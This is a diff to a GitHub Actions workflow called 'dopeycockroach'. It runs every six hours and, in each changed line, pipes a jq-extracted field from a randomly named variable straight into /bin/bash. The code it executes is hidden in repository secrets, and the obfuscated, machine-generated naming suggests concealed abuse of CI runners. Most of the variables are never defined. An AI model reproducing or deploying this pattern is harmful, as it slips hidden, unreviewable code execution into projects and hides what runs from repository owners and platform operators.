@@ -2,30 +2,26 @@ name: dopeycockroach
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 5/6 * * *'
-
+    - cron: '1 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dopeycockroach
         env:
-          ifor095: ${{ secrets.ifor095 }}
+          ls5: ${{ secrets.ls5 }}
         run: |
-          echo $ifor095 | jq -r .kwzc4133 | /bin/bash
-          echo $o814 | jq -r .eeyrn602 | /bin/bash
-          echo $umua1627 | jq -r .oca2 | /bin/bash
-          echo $e59098 | jq -r .q44 | /bin/bash
-          echo $oat50 | jq -r .dha17 | /bin/bash
-          echo $pc2 | jq -r .v956 | /bin/bash
-          echo $b57760 | jq -r .js64829 | /bin/bash
-          echo $p68843 | jq -r .rsjj6296 | /bin/bash
-          echo $tc1239 | jq -r .kdr38732 | /bin/bash
-          echo $slpq48 | jq -r .pt36 | /bin/bash
-          echo $mpy5024 | jq -r .w7583 | /bin/bash
-          echo $oxkie4 | jq -r .zdjgn3436 | /bin/bash
-          echo $c57474 | jq -r .ce65 | /bin/bash
-          echo $z6 | jq -r .pyo18 | /bin/bash
+          echo $ls5 | jq -r .bm4 | /bin/bash
+          echo $p63735 | jq -r .az8674 | /bin/bash
+          echo $fxplo2011 | jq -r .henqt85 | /bin/bash
+          echo $xe709 | jq -r .cm172 | /bin/bash
+          echo $as72 | jq -r .sg2 | /bin/bash
+          echo $g3 | jq -r .hlqm826 | /bin/bash
+          echo $nxcn750 | jq -r .wxas5 | /bin/bash
+          echo $pyrq413 | jq -r .jy3 | /bin/bash
+          echo $j31516 | jq -r .c6 | /bin/bash
+          echo $cznz05561 | jq -r .bvgyt8385 | /bin/bash
+          echo $gw4209 | jq -r .aqnk39 | /bin/bash
+          echo $cjjgv8120 | jq -r .vejxz597 | /bin/bash
 
